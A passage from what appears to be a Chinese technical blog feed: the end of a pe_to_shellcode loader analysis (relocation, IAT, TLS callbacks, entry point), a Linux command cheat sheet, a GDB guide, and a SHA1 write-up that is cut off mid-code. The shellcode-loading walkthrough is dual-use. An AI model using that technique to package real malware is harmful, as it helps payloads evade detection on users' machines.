alt="解析模块链表"></p><h5 id="2-2-2-2-修复重定位表"><a href="#2-2-2-2-修复重定位表" class="headerlink" title="2.2.2.2 修复重定位表"></a>2.2.2.2 修复重定位表</h5><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021232623940.png" alt="修复重定位表"></p><p>解析PE，完成固定地址的重定位，代码如下：</p><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021232717581.png" alt="修复重定位"></p><h5 id="2-2-2-3-修复IAT表"><a href="#2-2-2-3-修复IAT表" class="headerlink" title="2.2.2.3 修复IAT表"></a>2.2.2.3 修复IAT表</h5><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021232809517.png" alt="修复IAT表"></p><p>常规套路，根据INT表去获取导入函数地址来填充IAT表，代码如下：</p><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021232907344.png" alt="填充IAT表"></p><h5 id="2-2-2-4-执行TLS回调"><a href="#2-2-2-4-执行TLS回调" class="headerlink" title="2.2.2.4 执行TLS回调"></a>2.2.2.4 执行TLS回调</h5><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021233106219.png" alt="执行TLS回调"></p><p>如果存在TLS回调函数，全部执行，代码如下：</p><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021233131082.png" alt="执行TLS回调"></p><h5 id="2-2-2-5-执行入口点"><a href="#2-2-2-5-执行入口点" class="headerlink" title="2.2.2.5 执行入口点"></a>2.2.2.5 执行入口点</h5><p>如果是DLL，需要给定参数再去执行入口点，exe则直接执行，代码如下：</p><p><img src="/2022/10/21/pe-to-shellcode-yuan-ma-fen-xi/image-20221021233207841.png" alt="执行入口点"></p><p>至此，程序控制权交给原程序，完成ShellCode加载。</p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pe </tag>
            
            <tag> open-source </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令</title>
      <link href="/2022/10/19/linux-chang-yong-ming-ling/"/>
      <url>/2022/10/19/linux-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="1-帮助命令"><a href="#1-帮助命令" class="headerlink" title="1.帮助命令"></a>1.帮助命令</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看命令简要说明</span><br>whatis ls<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看官方文档</span><br>man ls<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用正则表达式</span><br>man -w &quot;ta*&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看路径</span><br>whereis ls<br></code></pre></td></tr></table></figure><h1 id="2-组合命令"><a href="#2-组合命令" class="headerlink" title="2.组合命令"></a>2.组合命令</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">连续运行多个命令</span><br>cmd1 ; cmd2<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">只有前一个命令OK，才会继续执行后面的</span><br>cmd1 &amp;&amp; cmd2<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">只有前一个命令Fail，才会继续执行后面的</span><br>cmd1 || cmd2<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">将命令的输出作为下一个命令的参数</span><br>&lt;cmd1&gt; $(&lt;cmd2&gt;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">将命令的输出作为下一个命令的输入</span><br>&lt;cmd1&gt; | &lt;cmd2&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">输出到文件</span><br>ls -la &gt; log.txt覆盖<br>ls -la &gt;&gt; log.txt追加<br></code></pre></td></tr></table></figure><h1 id="3-文件操作"><a href="#3-文件操作" class="headerlink" title="3.文件操作"></a>3.文件操作</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">全局搜索文件</span><br>find &lt;指定目录&gt; &lt;指定条件&gt; &lt;搜索内容&gt;<br>mlocate &lt;搜索内容&gt;# 查库，速度更快<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建文件</span><br>touch &lt;filename&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建文件夹</span><br>mkdir &lt;dirname&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">强制删除</span><br>rm -rf &lt;filename&gt;/&lt;dirname&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">移动</span><br>mv &lt;src&gt; &lt;dst&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">拷贝</span><br>cp &lt;src&gt; &lt;dst&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">时间顺序显示文件</span><br>ls -lrt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">搜索文件</span><br>find &lt;dir&gt; -name &#x27;&lt;filename&gt;&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">修改文件所有者</span><br>chown &lt;username&gt; &lt;filename&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">修改文件权限</span><br>chmod &lt;power&gt; &lt;filename&gt;<br>其中权限可以为三个8进制数字，分别表示属主权限、组权限、其他用户权限，4(读)、2(写)、1(执行)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">压缩与解压缩</span><br>.tar<br>解包：tar xvf &lt;filename&gt;.tar<br>打包：tar cvf &lt;filename&gt;.tar &lt;dir&gt;<br><br>.gz<br>解压1：gunzip &lt;filename&gt;.gz<br>解压2：gzip -d &lt;filename&gt;.gz<br>压缩：gzip &lt;filename&gt;.gz<br><br>.zip<br>解压：unzip &lt;filename&gt;.zip<br>压缩：zip &lt;filename&gt;.zip &lt;dir&gt;<br><br>.rar<br>解压：rar x &lt;filename&gt;.rar<br>压缩：rar a &lt;filename&gt;.rar &lt;dir&gt;<br><br>.rpm<br>解包：rpm2cpio &lt;filename&gt;.rpm | cpio -div<br><br>.deb<br>解包：ar p &lt;filname&gt;.deb data.tar.gz | tar zxf -<br></code></pre></td></tr></table></figure><h1 id="4-目录切换"><a href="#4-目录切换" class="headerlink" title="4.目录切换"></a>4.目录切换</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd &lt;dir&gt;<br>pwd<br><span class="hljs-meta prompt_"># </span><span class="language-bash">切换到home目录</span><br>cd ~<br></code></pre></td></tr></table></figure><h1 id="5-文本处理"><a href="#5-文本处理" class="headerlink" title="5.文本处理"></a>5.文本处理</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">文本搜索</span><br>grep &lt;str&gt; &lt;filename&gt;指定文件中搜索指定字符串<br>grep -e &lt;str1&gt; -e &lt;str2&gt; &lt;filename&gt;指定文件中搜索多个字符串<br></code></pre></td></tr></table></figure><h1 id="6-进程管理"><a href="#6-进程管理" class="headerlink" title="6.进程管理"></a>6.进程管理</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看当前系统中进程</span><br>ps -ef<br><span class="hljs-meta prompt_"># </span><span class="language-bash">监视进程状态</span><br>top<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看某个进程所打开的文件</span><br>lsof -p &lt;pid&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">终止进程</span><br>kill &lt;pid&gt;<br></code></pre></td></tr></table></figure><h1 id="7-网络相关"><a href="#7-网络相关" class="headerlink" title="7.网络相关"></a>7.网络相关</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">列出所有端口状态</span><br>netstat -a<br><span class="hljs-meta prompt_"># </span><span class="language-bash">列出所有tcp端口</span><br>netstat -at<br><span class="hljs-meta prompt_"># </span><span class="language-bash">列出所有监听的服务状态</span><br>netstat -l<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查询某个端口的进程</span><br>lsof -i:&lt;port&gt;<br>ps -ef | grep &lt;pid&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查询域名ip</span><br>host &lt;host&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">dns反查域名</span><br>host &lt;IP&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看路由状态</span><br>route -n<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">下载文件</span><br>wget &lt;url&gt;<br>-o: 指定日志文件<br>-c: 开启断点续传<br></code></pre></td></tr></table></figure><h1 id="8-账户相关"><a href="#8-账户相关" class="headerlink" title="8.账户相关"></a>8.账户相关</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">添加账户sudo</span> <br>sudo useradd -m &lt;username&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">修改密码</span><br>sudo passwd &lt;username&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">切换账户</span><br>su &lt;username&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看所有用户</span><br>more /etc/passwd<br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除账户</span><br>sudo userdel -r &lt;username&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">添加到组</span><br>usermod -G &lt;groupname&gt; &lt;username&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看所有组</span><br>more /etc/group<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB基础用法</title>
      <link href="/2022/10/19/gdb-ji-chu-yong-fa/"/>
      <url>/2022/10/19/gdb-ji-chu-yong-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="1-基础配置"><a href="#1-基础配置" class="headerlink" title="1.基础配置"></a>1.基础配置</h2><h3 id="1-1-源码调试"><a href="#1-1-源码调试" class="headerlink" title="1.1 源码调试"></a>1.1 源码调试</h3><p>安装cgdb图形化外壳，支持源码级断点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install cgdb<br></code></pre></td></tr></table></figure><p>修改cgdb配置文件</p><p><a href="https://cgdb.github.io/docs/cgdb.html#Configuring-CGDB">CGDB Manual 0.8.0</a></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini">vim ~/.cgdb/cgdbrc<br><br>file &lt;cgdbrc&gt;: <br>    <span class="hljs-comment"># 设置源码指针高亮</span><br>    set <span class="hljs-attr">arrowstyle</span> = highlight<br></code></pre></td></tr></table></figure><p><strong>演示如下：cgdb upx.out</strong></p><p><img src="/2022/10/19/gdb-ji-chu-yong-fa/image-20221019164033240.png" alt="cgdb调试源码"></p><h3 id="1-2-汇编调试"><a href="#1-2-汇编调试" class="headerlink" title="1.2 汇编调试"></a>1.2 汇编调试</h3><p>修改gdb配置文件</p><p><a href="https://wizardforcel.gitbooks.io/100-gdb-tips/content/layout-asm.html">显示汇编代码窗口 | 100个gdb小技巧 (gitbooks.io)</a></p><p><a href="http://www.deansys.com/doc/gdbDebugging/gdb_23.html">Debugging with GDB: TUI (deansys.com)</a></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs ini">vim ~/.gdbinit<br><br><span class="hljs-comment"># 初始化执行的命令</span><br>file &lt;.gdbinit&gt;<br>    <span class="hljs-comment"># intel汇编</span><br>    set disassembly-flavor intel<br><br><span class="hljs-comment"># 常用配置命令</span><br>    <span class="hljs-comment"># 单步显示汇编</span><br>    set disassemble-next-line on<br>    <span class="hljs-comment"># 显示寄存器窗口</span><br>    layout regs<br>    <span class="hljs-comment"># 显示汇编窗口</span><br>    layout asm<br>    <span class="hljs-comment"># 显示源码窗口</span><br>    layout source<br>    <span class="hljs-comment"># 聚焦窗口</span><br>    focus cmd<br>    focus asm<br>    focus src<br>    <span class="hljs-comment"># 更新源代码窗口到当前运行点</span><br>    update<br>    <span class="hljs-comment"># 增加指定窗口的高度</span><br>    winheight winname +count<br>    <span class="hljs-comment"># 减小指定窗口的高度</span><br>    winheight winname -count<br></code></pre></td></tr></table></figure><p><strong>演示如下：gdb -tui upx.out</strong></p><p><img src="/2022/10/19/gdb-ji-chu-yong-fa/image-20221019164434466.png" alt="gdb调试汇编"></p><h2 id="2-调试命令"><a href="#2-调试命令" class="headerlink" title="2.调试命令"></a>2.调试命令</h2><p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/base/index.html">Linux基础 — Linux Tools Quick Tutorial (linuxtools-rst.readthedocs.io)</a></p><h3 id="2-1-启动"><a href="#2-1-启动" class="headerlink" title="2.1 启动"></a>2.1 启动</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">gdb upx.out<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置参数</span><br>set args test.out<br><span class="hljs-meta prompt_"># </span><span class="language-bash">运行到main</span><br>start<br><span class="hljs-meta prompt_"># </span><span class="language-bash">结束调试</span><br>quit<br></code></pre></td></tr></table></figure><h3 id="2-2-执行"><a href="#2-2-执行" class="headerlink" title="2.2 执行"></a>2.2 执行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">run / continue 放行<br><br>n 源码级单步步过<br>ni汇编级单步步过<br>s源码级单步步入<br>si汇编级单步步入<br><br>finish执行完当前函数<br><br>until运行到循环结束<br>until + 行号   运行到某行<br></code></pre></td></tr></table></figure><h3 id="2-3-断点"><a href="#2-3-断点" class="headerlink" title="2.3 断点"></a>2.3 断点</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">b &lt;xxx.cpp&gt;:n在指定文件指定位置下断点<br>b *0x401000指定地址下断点<br>b xxxif xxx条件断点<br><br>rwatch *(int*)0x401000内存读断点<br>awatch *(int*)0x401000内存读写断点<br><br>info break查看断点列表<br><br>clear address删除指定地址处断点<br>delete n删除指定编号断点<br>disablen禁用指定编号断点<br>enable n启用指定编号断点<br></code></pre></td></tr></table></figure><h3 id="2-4-内存"><a href="#2-4-内存" class="headerlink" title="2.4 内存"></a>2.4 内存</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">x/&lt;n/f/u&gt; &lt;addr&gt;读内存<br><br>    n表示单元个数<br>    f表示显示的格式：<br>    x 按十六进制格式显示变量。<br>        d 按十进制格式显示变量。<br>        u 按十进制格式显示无符号整型。<br>        o 按八进制格式显示变量。<br>        t 按二进制格式显示变量。<br>        a 按十六进制格式显示变量。<br>        i 指令地址格式<br>        c 按字符格式显示变量。<br>        f 按浮点数格式显示变量。<br>    u表示每个单元大小：<br>    b表示单字节，<br>        h表示双字节，<br>        w表示四字节，<br>        g表示八字节<br>&lt;addr&gt;表示地址<br>print &lt;var&gt;输出某个变量的值<br>watch &lt;var&gt;监视某个变量的值<br><br>set *((int*)&lt;memaddr&gt;)= &lt;value&gt;写内存<br>set var &lt;var&gt; = &lt;value&gt;修改变量值<br></code></pre></td></tr></table></figure><h3 id="2-5-寄存器"><a href="#2-5-寄存器" class="headerlink" title="2.5 寄存器"></a>2.5 寄存器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">info $&lt;reg&gt;查看寄存器值<br>set $&lt;reg&gt; = &lt;value&gt;修改寄存器值<br></code></pre></td></tr></table></figure><h3 id="2-6-其他"><a href="#2-6-其他" class="headerlink" title="2.6 其他"></a>2.6 其他</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">backtrace调用堆栈<br>info pragram查看进程信息<br>set print pretty on格式化输出结构体<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
            <tag> gdb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto Basic</title>
      <link href="/2022/10/10/crypto-basic/"/>
      <url>/2022/10/10/crypto-basic/</url>
      
        <content type="html"><![CDATA[<h1 id="1-HASH算法"><a href="#1-HASH算法" class="headerlink" title="1.HASH算法"></a>1.HASH算法</h1><h2 id="1-1-SHA1"><a href="#1-1-SHA1" class="headerlink" title="1.1 SHA1"></a>1.1 SHA1</h2><h3 id="1-1-1-特点"><a href="#1-1-1-特点" class="headerlink" title="1.1.1 特点"></a>1.1.1 特点</h3><ul><li>生成的hash串长度为20字节</li><li>原始消息长度不能超过2的64次方减1</li></ul><h3 id="1-1-2-原理"><a href="#1-1-2-原理" class="headerlink" title="1.1.2 原理"></a>1.1.2 原理</h3><h4 id="1-1-2-1-原理图"><a href="#1-1-2-1-原理图" class="headerlink" title="1.1.2.1 原理图"></a>1.1.2.1 原理图</h4><p><img src="/2022/10/10/crypto-basic/image-20221013155621146.png" alt="SHA1原理图"></p><h4 id="1-1-2-2-消息分组补位"><a href="#1-1-2-2-消息分组补位" class="headerlink" title="1.1.2.2 消息分组补位"></a>1.1.2.2 消息分组补位</h4><p>通过补位使明文串满足对512取模为448，补位规则为第一位补1，其余位补0，448 + 64刚好为512，其中64bit为原始消息长度。</p><p><img src="/2022/10/10/crypto-basic/image-20221013160018490.png" alt="SHA1-补位结构"></p><h4 id="1-1-2-3-生成W分组"><a href="#1-1-2-3-生成W分组" class="headerlink" title="1.1.2.3 生成W分组"></a>1.1.2.3 生成W分组</h4><p>循环处理每一个512bit分组，将每一个分组按照32bit分成16份，依次为MT[0], MT[1]……MT[15]，再生成80份32bit的W分组，依次为W[0], W[1]……W[79]，W分组生成算法如下：</p><p><img src="/2022/10/10/crypto-basic/image-20221013160819656.png" alt="W分组生成算法"></p><p>其中那个ROTL是左移运算，W之间是异或运算。</p><h4 id="1-1-2-4-处理分组"><a href="#1-1-2-4-处理分组" class="headerlink" title="1.1.2.4 处理分组"></a>1.1.2.4 处理分组</h4><p>根据5个常数，进行80轮运算，最终得到5个数，最后这5个数分别与5个原始常数做加法后取模2的32次方，最终拼接即可获取首轮hash值</p><p>根据5个初始hash变量，进行80轮运算，初始值如下：</p><p><img src="/2022/10/10/crypto-basic/image-20221013161349587.png" alt="初始hash"></p><p>上述的H分别对应a, b, c, d, e，hash生成算法如下：</p><p><img src="/2022/10/10/crypto-basic/image-20221013161950387.png" alt="hash生成算法"></p><p>其中K公式如下：</p><p><img src="/2022/10/10/crypto-basic/image-20221013161915169.png" alt="K公式"></p><p>其中f1函数定义如下：</p><p><img src="/2022/10/10/crypto-basic/image-20221013162056058.png" alt="f1函数"></p><p>最终根据新的a, b, c, d, e生成新的H，作为下一轮运算的初始值，公式如下：</p><p><img src="/2022/10/10/crypto-basic/image-20221013162232466.png" alt="生成下一轮的初始值"></p><p>其中的 “ + “ 符号表示 x &#x3D; (a + b) % 2的32次方。</p><p>最终根据512bit分组的份数进行多次运算，最终生成的H拼接在一起即为结果hash。</p><h3 id="1-1-3-代码实现"><a href="#1-1-3-代码实现" class="headerlink" title="1.1.3 代码实现"></a>1.1.3 代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span 